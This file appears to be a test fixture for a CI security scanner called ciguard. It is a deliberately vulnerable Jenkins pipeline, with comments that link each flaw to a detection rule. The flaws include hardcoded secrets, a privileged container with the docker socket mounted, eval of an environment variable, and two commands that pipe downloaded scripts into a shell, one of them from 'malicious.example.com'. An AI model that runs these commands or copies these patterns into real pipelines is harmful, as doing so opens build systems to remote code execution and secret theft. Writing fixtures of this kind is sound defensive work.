// A deliberately vulnerable Declarative Jenkinsfile used by ciguard
// fixture tests. Each issue corresponds to a v0.4 starter rule.
pipeline {
    /* Triggers JKN-RUN-001 — unconstrained executor */
    agent any

    environment {
        // Triggers JKN-IAM-001 — secret-shaped key with literal value
        API_TOKEN = 'AbCdEfGhIjKlMnOpQrStUvWx12345'
        DB_PASSWORD = "hunter2hunter2_demo"
        // Safe binding — uses the Credentials Provider
        GITHUB_TOKEN = credentials('github-pat')
    }

    stages {
        stage('Build') {
            // Triggers JKN-PIPE-001 (image :latest)
            // Triggers JKN-RUN-002 (--privileged + docker socket mount)
            agent {
                docker {
                    image 'maven:latest'
                    args '-v /var/run/docker.sock:/var/run/docker.sock --privileged'
                }
            }
            steps {
                // Triggers JKN-SC-001 — curl pipe to bash
                sh 'curl -sSL https://get.example.com/install.sh | bash'
                sh '''
                    set -eu
                    echo "Building..."
                    eval "$DEPLOY_CMD"
                '''
                // Triggers JKN-SC-002 — dynamic Groovy block
                script {
                    def manifest = readJSON file: 'manifest.json'
                    Jenkins.instance.getItemByFullName(manifest.parent).build()
                }
            }
        }

        stage('Deploy') {
            // Triggers JKN-PIPE-001 — bare image, implicit :latest
            agent {
                docker { image 'alpine' }
            }
            steps {
                sh 'wget -O - https://malicious.example.com/run | sh'
            }
        }
    }
}
